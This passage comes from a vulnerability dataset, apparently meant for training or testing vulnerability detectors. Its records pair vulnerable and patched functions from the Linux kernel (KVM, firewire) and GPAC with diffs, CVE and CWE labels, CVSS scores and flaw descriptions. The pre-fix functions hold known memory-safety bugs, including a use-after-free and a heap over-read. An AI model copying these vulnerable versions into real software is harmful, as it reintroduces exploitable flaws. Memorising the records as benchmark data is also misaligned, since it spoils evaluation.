	free_page((unsigned long)VAR_0->run);
	kmem_cache_free(VAR_1, VAR_0);
}",torvalds/linux/5593473a1e6c743764b08e3b6071cb43b5cfa6c4/kvm_main.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,7 +1,7 @@
 static void kvm_vcpu_destroy(struct kvm_vcpu *vcpu)
 {
+	kvm_arch_vcpu_destroy(vcpu);
 	kvm_dirty_ring_free(&vcpu->dirty_ring);
-	kvm_arch_vcpu_destroy(vcpu);
 
 	/*
 	 * No need for rcu_read_lock as VCPU_RUN is the only place that changes","{'deleted_lines': ['\tkvm_arch_vcpu_destroy(vcpu);'], 'added_lines': ['\tkvm_arch_vcpu_destroy(vcpu);']}",True,"A NULL pointer dereference issue was found in KVM when releasing a vCPU with dirty ring support enabled. This flaw allows an unprivileged local attacker on the host to issue specific ioctl calls, causing a kernel oops condition that results in a denial of service.",5.5,MEDIUM,1,valid,2022-04-06T17:13:42Z,4
CVE-2023-3159,['CWE-416'],CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H,1,torvalds/linux,"firewire: fix potential uaf in outbound_phy_packet_callback()

&e->event and e point to the same address, and &e->event could
be freed in queue_event. So there is a potential uaf issue if
we dereference e after calling queue_event(). Fix this by adding
a temporary variable to maintain e->client in advance, this can
avoid the potential uaf issue.

Cc: <stable@vger.kernel.org>
Signed-off-by: Chengfeng Ye <cyeaa@connect.ust.hk>
Signed-off-by: Takashi Sakamoto <o-takashi@sakamocchi.jp>
Link: https://lore.kernel.org/r/20220409041243.603210-2-o-takashi@sakamocchi.jp
Signed-off-by: Takashi Iwai <tiwai@suse.de>",b7c81f80246fac44077166f3e07103affe6db8ff,https://github.com/torvalds/linux/commit/b7c81f80246fac44077166f3e07103affe6db8ff,drivers/firewire/core-cdev.c,outbound_phy_packet_callback,"static void outbound_phy_packet_callback(struct fw_packet *packet,
struct fw_card *card, int status)
{
struct outbound_phy_packet_event *e =
container_of(packet, struct outbound_phy_packet_event, p);
switch (status) {
case ACK_COMPLETE:e->phy_packet.rcode = RCODE_COMPLETE;break;
case ACK_PENDING:e->phy_packet.rcode = RCODE_COMPLETE;break;
case ACK_BUSY_X:
case ACK_BUSY_A:
case ACK_BUSY_B:e->phy_packet.rcode = RCODE_BUSY;break;
case ACK_DATA_ERROR:e->phy_packet.rcode = RCODE_DATA_ERROR;break;
case ACK_TYPE_ERROR:e->phy_packet.rcode = RCODE_TYPE_ERROR;break;
default:e->phy_packet.rcode = status;break;
}
e->phy_packet.data[0] = packet->timestamp;
queue_event(e->client, &e->event, &e->phy_packet,
sizeof(e->phy_packet) + e->phy_packet.length, NULL, 0);
client_put(e->client);
}","static void outbound_phy_packet_callback(struct fw_packet *VAR_0,
struct fw_card *VAR_1, int VAR_2)
{
struct outbound_phy_packet_event *VAR_3 =
container_of(VAR_0, struct outbound_phy_packet_event, VAR_4);
switch (VAR_2) {
case VAR_5:VAR_3->phy_packet.rcode = VAR_6;break;
case VAR_7:VAR_3->phy_packet.rcode = VAR_6;break;
case VAR_8:
case VAR_9:
case VAR_10:VAR_3->phy_packet.rcode = VAR_11;break;
case VAR_12:VAR_3->phy_packet.rcode = VAR_13;break;
case VAR_14:VAR_3->phy_packet.rcode = VAR_15;break;
default:VAR_3->phy_packet.rcode = VAR_2;break;
}
VAR_3->phy_packet.data[0] = VAR_0->timestamp;
queue_event(VAR_3->client, &VAR_3->event, &VAR_3->phy_packet,
sizeof(VAR_3->phy_packet) + VAR_3->phy_packet.length, NULL, 0);
client_put(VAR_3->client);
}",torvalds/linux/b7c81f80246fac44077166f3e07103affe6db8ff/core-cdev.c/vul/before/0.json,"static void outbound_phy_packet_callback(struct fw_packet *packet,
					 struct fw_card *card, int status)
{
	struct outbound_phy_packet_event *e =
		container_of(packet, struct outbound_phy_packet_event, p);
	struct client *e_client;

	switch (status) {
	/* expected: */
	case ACK_COMPLETE:	e->phy_packet.rcode = RCODE_COMPLETE;	break;
	/* should never happen with PHY packets: */
	case ACK_PENDING:	e->phy_packet.rcode = RCODE_COMPLETE;	break;
	case ACK_BUSY_X:
	case ACK_BUSY_A:
	case ACK_BUSY_B:	e->phy_packet.rcode = RCODE_BUSY;	break;
	case ACK_DATA_ERROR:	e->phy_packet.rcode = RCODE_DATA_ERROR;	break;
	case ACK_TYPE_ERROR:	e->phy_packet.rcode = RCODE_TYPE_ERROR;	break;
	/* stale generation; cancelled; on certain controllers: no ack */
	default:		e->phy_packet.rcode = status;		break;
	}
	e->phy_packet.data[0] = packet->timestamp;

	e_client = e->client;
	queue_event(e->client, &e->event, &e->phy_packet,
		    sizeof(e->phy_packet) + e->phy_packet.length, NULL, 0);
	client_put(e_client);
}","static void outbound_phy_packet_callback(struct fw_packet *VAR_0,
					 struct fw_card *VAR_1, int VAR_2)
{
	struct outbound_phy_packet_event *VAR_3 =
		container_of(VAR_0, struct outbound_phy_packet_event, VAR_4);
	struct client *VAR_5;

	switch (VAR_2) {
	/* COMMENT_0 */
	case VAR_6:	VAR_3->phy_packet.rcode = VAR_7;	break;
	/* COMMENT_1 */
	case VAR_8:	VAR_3->phy_packet.rcode = VAR_7;	break;
	case VAR_9:
	case VAR_10:
	case VAR_11:	VAR_3->phy_packet.rcode = VAR_12;	break;
	case VAR_13:	VAR_3->phy_packet.rcode = VAR_14;	break;
	case VAR_15:	VAR_3->phy_packet.rcode = VAR_16;	break;
	/* COMMENT_2 */
	default:		VAR_3->phy_packet.rcode = VAR_2;		break;
	}
	VAR_3->phy_packet.data[0] = VAR_0->timestamp;

	VAR_5 = VAR_3->client;
	queue_event(VAR_3->client, &VAR_3->event, &VAR_3->phy_packet,
		    sizeof(VAR_3->phy_packet) + VAR_3->phy_packet.length, NULL, 0);
	client_put(VAR_5);
}",torvalds/linux/b7c81f80246fac44077166f3e07103affe6db8ff/core-cdev.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,6 +3,7 @@
 {
 	struct outbound_phy_packet_event *e =
 		container_of(packet, struct outbound_phy_packet_event, p);
+	struct client *e_client;
 
 	switch (status) {
 	/* expected: */
@@ -19,7 +20,8 @@
 	}
 	e->phy_packet.data[0] = packet->timestamp;
 
+	e_client = e->client;
 	queue_event(e->client, &e->event, &e->phy_packet,
 		    sizeof(e->phy_packet) + e->phy_packet.length, NULL, 0);
-	client_put(e->client);
+	client_put(e_client);
 }","{'deleted_lines': ['\tclient_put(e->client);'], 'added_lines': ['\tstruct client *e_client;', '\te_client = e->client;', '\tclient_put(e_client);']}",True,A use after free issue was discovered in driver/firewire in outbound_phy_packet_callback in the Linux Kernel. In this flaw a local attacker with special privilege may cause a use after free problem when queue_event() fails.,6.7,MEDIUM,1,valid,2022-04-09T04:12:41Z,4
CVE-2022-29537,['CWE-125'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2173,1773b7a34bc08734aee7d3f5dfe65d06389fe15a,https://github.com/gpac/gpac/commit/1773b7a34bc08734aee7d3f5dfe65d06389fe15a,src/ietf/rtp_pck_mpeg4.c,gp_rtp_builder_do_avc,"GF_Err gp_rtp_builder_do_avc(GP_RTPPacketizer *builder, u8 *nalu, u32 nalu_size, u8 IsAUEnd, u32 FullAUSize)
{
u32 do_flush, bytesLeft, size, nal_type;
char shdr[2];
char stap_hdr;
do_flush = 0;
if (!nalu) do_flush = 1;
else if (builder->sl_header.accessUnitStartFlag) do_flush = 1;
else if (builder->bytesInPacket + nalu_size >= builder->Path_MTU) do_flush = 2;
else if (! (builder->flags & GP_RTP_PCK_USE_MULTI) ) do_flush = 2;
if (builder->bytesInPacket && do_flush) {
builder->rtp_header.Marker = (do_flush==1) ? 1 : 0;
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
}
if (!nalu) return GF_OK;
if (!builder->bytesInPacket) {
builder->rtp_header.PayloadType = builder->PayloadType;
builder->rtp_header.Marker = 0;
builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
builder->rtp_header.SequenceNumber += 1;
builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
builder->avc_non_idr = GF_TRUE;
}
nal_type = nalu[0] & 0x1F;
switch (nal_type) {
case GF_AVC_NALU_NON_IDR_SLICE:
case GF_AVC_NALU_ACCESS_UNIT:
case GF_AVC_NALU_END_OF_SEQ:
case GF_AVC_NALU_END_OF_STREAM:
case GF_AVC_NALU_FILLER_DATA:
break;
default:
builder->avc_non_idr = GF_FALSE;
break;
}
if (builder->bytesInPacket+nalu_size<builder->Path_MTU) {
Bool use_stap = GF_TRUE;
if (IsAUEnd && !builder->bytesInPacket) use_stap = GF_FALSE;
if (use_stap) {
if (!builder->bytesInPacket) {
stap_hdr = (nalu[0] & 0xE0) | 24;
builder->OnData(builder->cbk_obj, (char *) &stap_hdr, 1, GF_FALSE);
builder->bytesInPacket = 1;
}
shdr[0] = nalu_size>>8;
shdr[1] = nalu_size&0x00ff;
builder->OnData(builder->cbk_obj, (char *)shdr, 2, GF_FALSE);
builder->bytesInPacket += 2;
}
if (builder->OnDataReference)
builder->OnDataReference(builder->cbk_obj, nalu_size, 0);
else
builder->OnData(builder->cbk_obj, nalu, nalu_size, GF_FALSE);
builder->bytesInPacket += nalu_size;
if (IsAUEnd) {
builder->rtp_header.Marker = 1;
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
}
}
else {
u32 offset;
assert(nalu_size>=builder->Path_MTU);
assert(!builder->bytesInPacket);
bytesLeft = nalu_size - 1;
offset = 1;
while (bytesLeft) {
if (2 + bytesLeft > builder->Path_MTU) {
size = builder->Path_MTU - 2;
} else {
size = bytesLeft;
}
shdr[0] = (nalu[0] & 0xE0) | 28;
shdr[1] = (nalu[0] & 0x1F);
if (offset==1) shdr[1] |= 0x80;
else if (size == bytesLeft) shdr[1] |= 0x40;
builder->OnData(builder->cbk_obj, (char *)shdr, 2, GF_FALSE);
if (builder->OnDataReference)
builder->OnDataReference(builder->cbk_obj, size, offset);
else
builder->OnData(builder->cbk_obj, nalu+offset, size, GF_FALSE);
offset += size;
bytesLeft -= size;
builder->rtp_header.Marker = (IsAUEnd && !bytesLeft) ? 1 : 0;
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
if (bytesLeft) {
builder->rtp_header.PayloadType = builder->PayloadType;
builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
builder->rtp_header.SequenceNumber += 1;
builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
}
}
}
return GF_OK;
}","GF_Err gp_rtp_builder_do_avc(GP_RTPPacketizer *VAR_0, u8 *VAR_1, u32 VAR_2, u8 VAR_3, u32 VAR_4)
{
u32 VAR_5, VAR_6, VAR_7, VAR_8;
char VAR_9[2];
char VAR_10;
VAR_5 = 0;
if (!VAR_1) VAR_5 = 1;
else if (VAR_0->sl_header.accessUnitStartFlag) VAR_5 = 1;
else if (VAR_0->bytesInPacket + VAR_2 >= VAR_0->Path_MTU) VAR_5 = 2;
else if (! (VAR_0->flags & VAR_11) ) VAR_5 = 2;
if (VAR_0->bytesInPacket && VAR_5) {
VAR_0->rtp_header.Marker = (VAR_5==1) ? 1 : 0;
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
}
if (!VAR_1) return VAR_12;
if (!VAR_0->bytesInPacket) {
VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
VAR_0->rtp_header.Marker = 0;
VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
VAR_0->rtp_header.SequenceNumber += 1;
VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->avc_non_idr = VAR_13;
}
VAR_8 = VAR_1[0] & 0x1F;
switch (VAR_8) {
case VAR_14:
case VAR_15:
case VAR_16:
case VAR_17:
case VAR_18:
break;
default:
VAR_0->avc_non_idr = VAR_19;
break;
}
if (VAR_0->bytesInPacket+VAR_2<VAR_0->Path_MTU) {
Bool VAR_20 = VAR_13;
if (VAR_3 && !VAR_0->bytesInPacket) VAR_20 = VAR_19;
if (VAR_20) {
if (!VAR_0->bytesInPacket) {
VAR_10 = (VAR_1[0] & 0xE0) | 24;
VAR_0->OnData(VAR_0->cbk_obj, (char *) &VAR_10, 1, VAR_19);
VAR_0->bytesInPacket = 1;
}
VAR_9[0] = VAR_2>>8;
VAR_9[1] = VAR_2&0x00ff;
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_9, 2, VAR_19);
VAR_0->bytesInPacket += 2;
}
if (VAR_0->OnDataReference)
VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_2, 0);
else
VAR_0->OnData(VAR_0->cbk_obj, VAR_1, VAR_2, VAR_19);
VAR_0->bytesInPacket += VAR_2;
if (VAR_3) {
VAR_0->rtp_header.Marker = 1;
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
}
}
else {
u32 VAR_21;
assert(VAR_2>=VAR_0->Path_MTU);
assert(!VAR_0->bytesInPacket);
VAR_6 = VAR_2 - 1;
VAR_21 = 1;
while (VAR_6) {
if (2 + VAR_6 > VAR_0->Path_MTU) {
VAR_7 = VAR_0->Path_MTU - 2;
} else {
VAR_7 = VAR_6;
}
VAR_9[0] = (VAR_1[0] & 0xE0) | 28;
VAR_9[1] = (VAR_1[0] & 0x1F);
if (VAR_21==1) VAR_9[1] |= 0x80;
else if (VAR_7 == VAR_6) VAR_9[1] |= 0x40;
VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_9, 2, VAR_19);
if (VAR_0->OnDataReference)
VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_7, VAR_21);
else
VAR_0->OnData(VAR_0->cbk_obj, VAR_1+VAR_21, VAR_7, VAR_19);
VAR_21 += VAR_7;
VAR_6 -= VAR_7;
VAR_0->rtp_header.Marker = (VAR_3 && !VAR_6) ? 1 : 0;
VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
VAR_0->bytesInPacket = 0;
if (VAR_6) {
VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
VAR_0->rtp_header.SequenceNumber += 1;
VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
}
}
}
return VAR_12;
}",gpac/1773b7a34bc08734aee7d3f5dfe65d06389fe15a/rtp_pck_mpeg4.c/vul/before/2.json,"GF_Err gp_rtp_builder_do_avc(GP_RTPPacketizer *builder, u8 *nalu, u32 nalu_size, u8 IsAUEnd, u32 FullAUSize)
{
	u32 do_flush, bytesLeft, size, nal_type;
	char shdr[2];
	char stap_hdr;

	do_flush = 0;
	if (!nalu) do_flush = 1;
	/*we only do STAP or SINGLE modes*/
	else if (builder->sl_header.accessUnitStartFlag) do_flush = 1;
	/*we must NOT fragment a NALU*/
	else if (builder->bytesInPacket + nalu_size >= builder->Path_MTU) do_flush = 2;
	/*aggregation is disabled*/
	else if (! (builder->flags & GP_RTP_PCK_USE_MULTI) ) do_flush = 2;

	if (builder->bytesInPacket && do_flush) {
		builder->rtp_header.Marker = (do_flush==1) ? 1 : 0;
		builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
		builder->bytesInPacket = 0;
	}

	if (!nalu) return GF_OK;
	if (nalu_size<1) return GF_NON_COMPLIANT_BITSTREAM;

	/*need a new RTP packet*/
	if (!builder->bytesInPacket) {
		builder->rtp_header.PayloadType = builder->PayloadType;
		builder->rtp_header.Marker = 0;
		builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
		builder->rtp_header.SequenceNumber += 1;
		builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
		builder->avc_non_idr = GF_TRUE;
	}

	/*check NAL type to see if disposable or not*/
	nal_type = nalu[0] & 0x1F;
	switch (nal_type) {
	case GF_AVC_NALU_NON_IDR_SLICE:
	case GF_AVC_NALU_ACCESS_UNIT:
	case GF_AVC_NALU_END_OF_SEQ:
	case GF_AVC_NALU_END_OF_STREAM:
	case GF_AVC_NALU_FILLER_DATA:
		break;
	default:
		builder->avc_non_idr = GF_FALSE;
		break;
	}

	/*at this point we're sure the NALU fits in current packet OR must be splitted*/

	/*pb: we don't know if next NALU from this AU will be small enough to fit in the packet, so we always
	go for stap...*/
	if (builder->bytesInPacket+nalu_size<builder->Path_MTU) {
		Bool use_stap = GF_TRUE;
		/*if this is the AU end and no NALU in packet, go for single mode*/
		if (IsAUEnd && !builder->bytesInPacket) use_stap = GF_FALSE;

		if (use_stap) {
			/*declare STAP-A NAL*/
			if (!builder->bytesInPacket) {
				/*copy over F and NRI from first nal in packet and assign type*/
				stap_hdr = (nalu[0] & 0xE0) | 24;
				builder->OnData(builder->cbk_obj, (char *) &stap_hdr, 1, GF_FALSE);
				builder->bytesInPacket = 1;
			}
			/*add NALU size*/
			shdr[0] = nalu_size>>8;
			shdr[1] = nalu_size&0x00ff;
			builder->OnData(builder->cbk_obj, (char *)shdr, 2, GF_FALSE);
			builder->bytesInPacket += 2;
		}
		/*add data*/
		if (builder->OnDataReference)
			builder->OnDataReference(builder->cbk_obj, nalu_size, 0);
		else
			builder->OnData(builder->cbk_obj, nalu, nalu_size, GF_FALSE);

		builder->bytesInPacket += nalu_size;

		if (IsAUEnd) {
			builder->rtp_header.Marker = 1;
			builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
			builder->bytesInPacket = 0;
		}
	}
	/*fragmentation unit*/
	else {
		u32 offset;
		assert(nalu_size>=builder->Path_MTU);
		assert(!builder->bytesInPacket);
		/*FU payload doesn't have the NAL hdr*/
		bytesLeft = nalu_size - 1;
		offset = 1;
		while (bytesLeft) {
			if (2 + bytesLeft > builder->Path_MTU) {
				size = builder->Path_MTU - 2;
			} else {
				size = bytesLeft;
			}

			/*copy over F and NRI from nal in packet and assign type*/
			shdr[0] = (nalu[0] & 0xE0) | 28;
			/*copy over NAL type from nal and set start bit and end bit*/
			shdr[1] = (nalu[0] & 0x1F);
			/*start bit*/
			if (offset==1) shdr[1] |= 0x80;
			/*end bit*/
			else if (size == bytesLeft) shdr[1] |= 0x40;

			builder->OnData(builder->cbk_obj, (char *)shdr, 2, GF_FALSE);

			/*add data*/
			if (builder->OnDataReference)
				builder->OnDataReference(builder->cbk_obj, size, offset);
			else
				builder->OnData(builder->cbk_obj, nalu+offset, size, GF_FALSE);

			offset += size;
			bytesLeft -= size;

			/*flush no matter what (FUs cannot be agreggated)*/
			builder->rtp_header.Marker = (IsAUEnd && !bytesLeft) ? 1 : 0;
			builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
			builder->bytesInPacket = 0;

			if (bytesLeft) {
				builder->rtp_header.PayloadType = builder->PayloadType;
				builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
				builder->rtp_header.SequenceNumber += 1;
				builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
			}
		}
	}

	return GF_OK;
}","GF_Err gp_rtp_builder_do_avc(GP_RTPPacketizer *VAR_0, u8 *VAR_1, u32 VAR_2, u8 VAR_3, u32 VAR_4)
{
	u32 VAR_5, VAR_6, VAR_7, VAR_8;
	char VAR_9[2];
	char VAR_10;

	VAR_5 = 0;
	if (!VAR_1) VAR_5 = 1;
	/* COMMENT_0 */
	else if (VAR_0->sl_header.accessUnitStartFlag) VAR_5 = 1;
	/* COMMENT_1 */
	else if (VAR_0->bytesInPacket + VAR_2 >= VAR_0->Path_MTU) VAR_5 = 2;
	/* COMMENT_2 */
	else if (! (VAR_0->flags & VAR_11) ) VAR_5 = 2;

	if (VAR_0->bytesInPacket && VAR_5) {
		VAR_0->rtp_header.Marker = (VAR_5==1) ? 1 : 0;
		VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
		VAR_0->bytesInPacket = 0;
	}

	if (!VAR_1) return VAR_12;
	if (VAR_2<1) return VAR_13;

	/* COMMENT_3 */
	if (!VAR_0->bytesInPacket) {
		VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
		VAR_0->rtp_header.Marker = 0;
		VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
		VAR_0->rtp_header.SequenceNumber += 1;
		VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
		VAR_0->avc_non_idr = VAR_14;
	}

	/* COMMENT_4 */
	VAR_8 = VAR_1[0] & 0x1F;
	switch (VAR_8) {
	case VAR_15:
	case VAR_16:
	case VAR_17:
	case VAR_18:
	case VAR_19:
		break;
	default:
		VAR_0->avc_non_idr = VAR_20;
		break;
	}

	/* COMMENT_5 */

	/* COMMENT_6 */
                 
	if (VAR_0->bytesInPacket+VAR_2<VAR_0->Path_MTU) {
		Bool VAR_21 = VAR_14;
		/* COMMENT_8 */
		if (VAR_3 && !VAR_0->bytesInPacket) VAR_21 = VAR_20;

		if (VAR_21) {
			/* COMMENT_9 */
			if (!VAR_0->bytesInPacket) {
				/* COMMENT_10 */
				VAR_10 = (VAR_1[0] & 0xE0) | 24;
				VAR_0->OnData(VAR_0->cbk_obj, (char *) &VAR_10, 1, VAR_20);
				VAR_0->bytesInPacket = 1;
			}
			/* COMMENT_11 */
			VAR_9[0] = VAR_2>>8;
			VAR_9[1] = VAR_2&0x00ff;
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_9, 2, VAR_20);
			VAR_0->bytesInPacket += 2;
		}
		/* COMMENT_12 */
		if (VAR_0->OnDataReference)
			VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_2, 0);
		else
			VAR_0->OnData(VAR_0->cbk_obj, VAR_1, VAR_2, VAR_20);

		VAR_0->bytesInPacket += VAR_2;

		if (VAR_3) {
			VAR_0->rtp_header.Marker = 1;
			VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
			VAR_0->bytesInPacket = 0;
		}
	}
	/* COMMENT_13 */
	else {
		u32 VAR_22;
		assert(VAR_2>=VAR_0->Path_MTU);
		assert(!VAR_0->bytesInPacket);
		/* COMMENT_14 */
		VAR_6 = VAR_2 - 1;
		VAR_22 = 1;
		while (VAR_6) {
			if (2 + VAR_6 > VAR_0->Path_MTU) {
				VAR_7 = VAR_0->Path_MTU - 2;
			} else {
				VAR_7 = VAR_6;
			}

			/* COMMENT_15 */
			VAR_9[0] = (VAR_1[0] & 0xE0) | 28;
			/* COMMENT_16 */
			VAR_9[1] = (VAR_1[0] & 0x1F);
			/* COMMENT_17 */
			if (VAR_22==1) VAR_9[1] |= 0x80;
			/* COMMENT_18 */
			else if (VAR_7 == VAR_6) VAR_9[1] |= 0x40;

			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_9, 2, VAR_20);

			/* COMMENT_12 */
			if (VAR_0->OnDataReference)
				VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_7, VAR_22);
			else
				VAR_0->OnData(VAR_0->cbk_obj, VAR_1+VAR_22, VAR_7, VAR_20);

			VAR_22 += VAR_7;
			VAR_6 -= VAR_7;

			/* COMMENT_19 */
			VAR_0->rtp_header.Marker = (VAR_3 && !VAR_6) ? 1 : 0;
			VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
			VAR_0->bytesInPacket = 0;

			if (VAR_6) {
				VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
				VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
				VAR_0->rtp_header.SequenceNumber += 1;
				VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
			}
		}
	}

	return VAR_12;
}",gpac/1773b7a34bc08734aee7d3f5dfe65d06389fe15a/rtp_pck_mpeg4.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -20,6 +20,7 @@
 	}
 
 	if (!nalu) return GF_OK;
+	if (nalu_size<1) return GF_NON_COMPLIANT_BITSTREAM;
 
 	/*need a new RTP packet*/
 	if (!builder->bytesInPacket) {","{'deleted_lines': [], 'added_lines': ['\tif (nalu_size<1) return GF_NON_COMPLIANT_BITSTREAM;']}",True,"gp_rtp_builder_do_hevc in ietf/rtp_pck_mpeg4.c in GPAC 2.0.0 has a heap-based buffer over-read, as demonstrated by MP4Box.",5.5,MEDIUM,1,valid,2022-04-19T07:08:45Z,4
CVE-2022-29537,['CWE-125'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2173,1773b7a34bc08734aee7d3f5dfe65d06389fe15a,https://github.com/gpac/gpac/commit/1773b7a34bc08734aee7d3f5dfe65d06389fe15a,src/ietf/rtp_pck_mpeg4.c,gp_rtp_builder_do_vvc,"GF_Err gp_rtp_builder_do_vvc(GP_RTPPacketizer *builder, u8 *nalu, u32 nalu_size, u8 IsAUEnd, u32 FullAUSize)
{
u32 do_flush, bytesLeft, size;
do_flush = 0;
if (!nalu) do_flush = 1;
else if (builder->sl_header.accessUnitStartFlag) do_flush = 1;
else if (builder->bytesInPacket + nalu_size + 4 >= builder->Path_MTU) do_flush = 2; 
else if (! (builder->flags & GP_RTP_PCK_USE_MULTI) ) do_flush = 2;
if (builder->bytesInPacket && do_flush) {
builder->rtp_header.Marker = (do_flush==1) ? 1 : 0;
if (strlen(builder->hevc_payload_hdr)) {
builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
memset(builder->hevc_payload_hdr, 0, 2);
}
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
}
if (!nalu) return GF_OK;
if (!builder->bytesInPacket) {
builder->rtp_header.PayloadType = builder->PayloadType;
builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
builder->rtp_header.SequenceNumber += 1;
builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
}
if (builder->bytesInPacket+nalu_size+4 < builder->Path_MTU) {
Bool use_AP = (builder->flags & GP_RTP_PCK_USE_MULTI) ? GF_TRUE : GF_FALSE;
if (IsAUEnd && !builder->bytesInPacket) use_AP = GF_FALSE;
if (use_AP) {
char nal_s[2];
if (!builder->bytesInPacket) {
builder->hevc_payload_hdr[0] = nalu[0];
builder->hevc_payload_hdr[1] = (RTP_VVC_AGG_NAL << 3) | (nalu[1] & 0x7);
}
else {
u8 cur_LayerId, cur_TID, new_LayerId, new_TID;
builder->hevc_payload_hdr[0] |= (nalu[0] & 0x80);
cur_LayerId = (builder->hevc_payload_hdr[0] & 0x3F);
new_LayerId = (nalu[0] & 0x3F);
if (cur_LayerId > new_LayerId) {
builder->hevc_payload_hdr[0] = (builder->hevc_payload_hdr[0] & 0xC0) | new_LayerId;
}
cur_TID = builder->hevc_payload_hdr[1] & 0x3;
new_TID = nalu[1] & 0x3;
if (cur_TID > new_TID) {
builder->hevc_payload_hdr[1] = (builder->hevc_payload_hdr[1] & 0xF8) | new_TID;
}
}
nal_s[0] = nalu_size>>8;
nal_s[1] = nalu_size&0x00ff;
builder->OnData(builder->cbk_obj, (char *)nal_s, 2, GF_FALSE);
builder->bytesInPacket += 2;
}
if (builder->OnDataReference)
builder->OnDataReference(builder->cbk_obj, nalu_size, 0);
else
builder->OnData(builder->cbk_obj, nalu, nalu_size, GF_FALSE);
builder->bytesInPacket += nalu_size;
if (IsAUEnd) {
builder->rtp_header.Marker = 1;
if (strlen(builder->hevc_payload_hdr)) {
builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
memset(builder->hevc_payload_hdr, 0, 2);
}
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
}
}
else {
u32 offset;
u8 payload_hdr[2];
u8 shdr;
assert(nalu_size + 4 >=builder->Path_MTU);
assert(!builder->bytesInPacket);
bytesLeft = nalu_size - 2;
offset = 2;
while (bytesLeft) {
u8 nut;
if (3 + bytesLeft > builder->Path_MTU) {
size = builder->Path_MTU - 3;
} else {
size = bytesLeft;
}
memset(payload_hdr, 0, 2);
payload_hdr[0] = nalu[0];
payload_hdr[1] = (((u32) RTP_VVC_FRAG_NAL) << 3) | (nalu[1] & 0x7);
builder->OnData(builder->cbk_obj, (char *)payload_hdr, 2, GF_FALSE);
nut = nalu[1] >> 3;
shdr = 0;
shdr |= nut;
if (offset==2) shdr |= 0x80;
else if (size == bytesLeft) {
shdr |= 0x40;
if (nut <= GF_VVC_NALU_SLICE_GDR) {
shdr |= 0x20;
}
}
builder->OnData(builder->cbk_obj, &shdr, 1, GF_FALSE);
if (builder->OnDataReference)
builder->OnDataReference(builder->cbk_obj, size, offset);
else
builder->OnData(builder->cbk_obj, nalu+offset, size, GF_FALSE);
offset += size;
bytesLeft -= size;
builder->rtp_header.Marker = (IsAUEnd && !bytesLeft) ? 1 : 0;
builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
builder->bytesInPacket = 0;
if (bytesLeft) {
builder->rtp_header.PayloadType = builder->PayloadType;
builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
builder->rtp_header.SequenceNumber += 1;
builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
}
}
}
return GF_OK;
}","GF_Err gp_rtp_builder_do_vvc(GP_RTPPacketizer *VAR_0, u8 *VAR_1, u32 VAR_2, u8 VAR_3, u32 VAR_4)
{
u32 VAR_5, VAR_6, VAR_7;
VAR_5 = 0;
if (!VAR_1) VAR_5 = 1;
else if (VAR_0->sl_header.accessUnitStartFlag) VAR_5 = 1;
